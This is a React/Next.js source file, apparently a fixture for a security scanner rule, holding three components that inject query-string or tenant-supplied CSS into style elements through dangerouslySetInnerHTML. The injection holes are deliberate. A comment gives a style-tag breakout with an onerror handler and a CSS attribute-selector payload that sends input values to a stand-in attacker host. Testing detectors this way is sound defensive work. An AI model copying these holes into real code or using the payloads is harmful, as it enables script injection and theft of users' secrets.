"use client"

import * as React from "react"
import { useSearchParams } from "next/navigation"

/**
 * "Themeable" embed widget. The accent colour and a whole CSS override blob
 * are read straight off the query string and interpolated into a <style>
 * element via dangerouslySetInnerHTML.
 *
 * A <style> host is not a free pass: an attacker who controls the CSS text can
 *   - break out of the RAWTEXT context with `</style><img src=x onerror=...>`
 *     (event handlers on innerHTML-inserted elements DO fire), and
 *   - without any breakout at all, exfiltrate secrets with attribute
 *     selectors, e.g. input[value^="a"]{background:url(//attacker/a)}.
 *
 * VC063 must keep firing at critical here.
 */
export function EmbedTheme() {
  const params = useSearchParams()
  const accent = params.get("accent") ?? "#111827"
  const overrides = params.get("css") ?? ""

  return (
    <>
      <style
        dangerouslySetInnerHTML={{
          __html: `
:root { --embed-accent: ${accent}; }
${overrides}
`,
        }}
      />
      <div className="embed-root">Embedded widget</div>
    </>
  )
}

export function TenantBranding({ tenantCss }: { tenantCss: string }) {
  // Tenant-supplied stylesheet body, stored in the DB and rendered verbatim.
  return <style dangerouslySetInnerHTML={{ __html: tenantCss }} />
}

export function PreviewFrame() {
  const raw = new URLSearchParams(window.location.search).get("skin") ?? ""
  return (
    <style
      dangerouslySetInnerHTML={{
        __html: `.preview { ${raw} }`,
      }}
    />
  )
}
